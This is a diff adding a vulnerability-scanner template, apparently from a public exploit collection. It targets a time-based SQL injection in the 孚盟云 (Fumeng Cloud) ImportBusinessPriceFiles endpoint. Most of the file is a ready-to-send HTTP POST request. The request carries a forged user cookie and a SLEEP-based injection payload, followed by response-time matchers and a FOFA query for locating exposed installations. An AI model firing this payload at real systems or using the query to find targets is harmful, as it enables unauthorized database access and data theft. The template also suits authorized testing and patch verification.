@@ -1,0 +1,28 @@
+## id: VEID-2026-11109
+## name: 孚盟云-ImportBusinessPriceFiles-sql注入
+## author: hack007x
+## severity: high
+## tags: veid,sql,veid2026
+## description: 孚盟云-ImportBusinessPriceFiles-sql注入，攻击者可进行sql注入攻击获取数据库信息或者权限。
+## affects: 孚盟云
+## fofa-query: app="孚盟软件-孚盟云"
+## verification: true
+
+
+
+POST /m/Dingding/Ajax/AjaxBusinessPrice.ashx HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+Cookie: UserCookie={"empId":"1"}
+Content-Type: application/x-www-form-urlencoded
+
+action=ImportBusinessPriceFiles&templateId=1%27AND+%28SELECT+4920+FROM+%28SELECT%28SLEEP%286%29%29%29ILaK%29--+-&Fid=1&type=1
+
+#@ timeout: 20
+#@ condition: and
+#@ matcher: response_time >= 6 && response_time < 8
+#@ matcher: header["Content-Type"] contains "plain" 
+#@ matcher: status_code == 200
+
+
+# @VEIL-STAMP: a7caf103afee48be02680ad251ffa015f745d81874615698d3011f1e71692669
